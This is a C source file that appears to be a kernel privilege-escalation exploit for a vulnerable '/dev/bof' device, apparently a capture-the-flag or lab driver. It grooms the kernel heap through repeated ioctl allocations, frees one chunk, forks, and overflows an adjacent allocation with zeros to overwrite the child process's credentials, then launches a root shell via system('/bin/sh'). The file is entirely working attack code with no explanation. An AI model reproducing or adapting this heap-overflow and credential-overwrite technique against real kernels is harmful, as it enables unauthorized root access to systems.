#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
struct param
{
    size_t len;
    char* buf;
    unsigned long idx;
};
int main(void)
{
    int fds[10];
    int ptmx_fds[0x100];
    char buf[8];
    int fd;
    for (int i = 0; i < 10; ++i)
    {
        fd = open("/dev/bof", O_RDWR);
        if (fd == -1) {
            printf("open bof device failed!\n");
            return -1;
        }
        fds[i] = fd;
    }
    struct param p;
    p.len = 0xa8;
    p.buf = malloc(p.len);

    for (int i = 0; i < 10; ++i)
    {
        p.idx = 1;
        ioctl(fds[0], 5, &p);  // malloc
    }
    printf("clear heap done\n");

    for (int i = 0; i < 10; ++i)
    {
        p.idx = i;
        ioctl(fds[i], 5, &p);  // malloc
    }
    p.idx = 5;
    ioctl(fds[5], 7, &p); // free
    int now_uid;

    int pid = fork();
    if (pid < 0) {
        perror("fork error");
        return 0;
    }
    p.idx = 4;
    p.len = 0xc0 + 0x30;
    memset(p.buf, 0, p.len);
    ioctl(fds[4], 8, &p);    
    if (!pid) {
        now_uid = getuid();
        printf("uid: %x\n", now_uid);
        if (!now_uid) {
            // printf("get root done\n");

            system("/bin/sh");
        } else {
            // puts("failed?");

        }
    } else {
        wait(0);
    }
    getchar();
    return 0;
}
